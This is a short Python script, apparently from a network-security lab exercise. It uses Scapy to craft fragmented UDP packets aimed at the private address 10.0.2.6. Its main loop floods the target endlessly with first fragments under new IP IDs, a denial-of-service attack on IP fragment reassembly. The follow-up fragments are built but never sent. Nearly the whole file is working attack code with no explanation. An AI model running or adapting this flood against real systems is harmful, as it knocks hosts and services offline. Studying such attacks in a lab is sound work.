#!/usr/bin/python3
from scapy.all import *

ID = 1002
payload = "A" * 8
payload_2 =  "B" * 32 
payload_3 = "C" *32

######################################
## First Fragment 
######################################

udp = UDP(sport=7070, dport=9090)
udp.len = 8 + 32 + 32
ip = IP(dst="10.0.2.6") 
ip.id = ID
ip.frag = 0
ip.flags = 1
pkt = ip/udp/payload
pkt[UDP].chksum = 0

#No.2
ip.frag =1 
ip.proto=17
pkt1 = ip/payload_2
#No.3
ip.frag = 5
ip.flags = 0
pkt2 = ip/payload_3
while True:
    ip.id += 1
    pkt = ip/udp/payload
    send(pkt,verbose=0)
#send(pkt1,verbose=0)
#send(pkt2,verbose=0)

